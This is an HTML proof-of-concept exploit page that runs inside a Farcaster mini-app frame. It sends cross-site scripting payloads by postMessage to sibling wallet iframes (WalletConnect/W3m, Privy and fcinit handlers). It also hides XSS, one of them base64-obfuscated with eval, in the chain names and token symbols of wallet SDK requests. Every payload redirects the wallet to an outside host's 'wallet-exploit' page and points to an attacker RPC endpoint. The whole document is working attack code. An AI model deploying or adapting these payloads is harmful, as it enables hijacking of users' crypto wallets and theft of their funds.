<!doctype html>
<html>
<head><meta charset="utf-8"><title>PoC</title></head>
<body>
<pre id="log">Loading exploit...</pre>
<script>
var logEl = document.getElementById('log');
var log = function(m) { logEl.textContent += '\n' + m; console.log(m); };

// Signal ready to farcaster.xyz parent
setTimeout(function() {
  window.parent.postMessage({ id: 1, type: 'APPLY', path: ['ready'],
    argumentList: [{ type: 'RAW', value: {} }] }, '*');
  log('SDK ready');
}, 1500);

setTimeout(function() {
  log('--- Targeting wallet iframes ---');

  // Get all sibling frames via parent
  var frameCount = 0;
  try { frameCount = window.parent.frames.length; } catch(e) {}
  log('Sibling frames: ' + frameCount);

  // Send XSS payloads to every frame
  // The wallet iframe has NO sandbox and handlers without origin checks
  for (var i = 0; i < frameCount; i++) {
    try {
      var frame = window.parent.frames[i];

      // W3mFrame handler — no origin check
      frame.postMessage({ '@w3m-frame/': { type: '@w3m-frame/RPC_REQUEST', html: '<img src=x onerror="var m=document.createElement(\'meta\');m.httpEquiv=\'refresh\';m.content=\'0;url=https://screenshotsart.store/wallet-exploit.html\';document.head.appendChild(m)">' } }, '*');

      // Error messages that might render as HTML
      frame.postMessage({ type: 'error', message: '<meta http-equiv="refresh" content="0;url=https://screenshotsart.store/wallet-exploit.html">' }, '*');

      // Privy
      frame.postMessage({ type: 'privy:embedded-wallet:error', message: '<img src=x onerror="var m=document.createElement(\'meta\');m.httpEquiv=\'refresh\';m.content=\'0;url=https://screenshotsart.store/wallet-exploit.html\';document.head.appendChild(m)">' }, '*');

      // fcinit bridge
      frame.postMessage({ fcinit: 'v1', type: 'error', message: '<img src=x onerror="var m=document.createElement(\'meta\');m.httpEquiv=\'refresh\';m.content=\'0;url=https://screenshotsart.store/wallet-exploit.html\';document.head.appendChild(m)">' }, '*');

    } catch(e) {
      log('Frame ' + i + ' error: ' + e.message);
    }
  }
  log('Payloads sent to ' + frameCount + ' frames');

  // Also use SDK to trigger wallet UI with XSS in parameters
  // wallet_addEthereumChain shows chain name in wallet UI
  window.parent.postMessage({
    id: 2000, type: 'APPLY', path: ['ethProviderRequestV2'],
    argumentList: [{ type: 'RAW', value: {
      method: 'wallet_addEthereumChain',
      params: [{
        chainId: '0x539',
        chainName: '<img src=x onerror="var m=document.createElement(\'meta\');m.httpEquiv=\'refresh\';m.content=\'0;url=https://screenshotsart.store/wallet-exploit.html\';document.head.appendChild(m)">',
        rpcUrls: ['https://screenshotsart.store/rpc'],
        nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 }
      }]
    }}]
  }, '*');

  // wallet_watchAsset shows token symbol in wallet UI
  window.parent.postMessage({
    id: 2001, type: 'APPLY', path: ['ethProviderRequestV2'],
    argumentList: [{ type: 'RAW', value: {
      method: 'wallet_watchAsset',
      params: { type: 'ERC20', options: {
        address: '0x0000000000000000000000000000000000000001',
        symbol: '<img/src=x onerror=eval(atob("dmFyIG09ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnbWV0YScpO20uaHR0cEVxdWl2PSdyZWZyZXNoJzttLmNvbnRlbnQ9JzA7dXJsPWh0dHBzOi8vc2NyZWVuc2hvdHNhcnQuc3RvcmUvd2FsbGV0LWV4cGxvaXQnO2RvY3VtZW50LmhlYWQuYXBwZW5kQ2hpbGQobSk="))>',
        decimals: 18, image: 'https://screenshotsart.store/icon.png'
      }}
    }}]
  }, '*');

  log('SDK wallet payloads sent');
}, 3000);

// Listen for responses
window.addEventListener('message', function(e) {
  var str = JSON.stringify(e.data).slice(0, 200);
  if (!str.includes('webpack') && !str.includes('devtools'))
    log('MSG: ' + str);
});
</script>
</body>
</html>
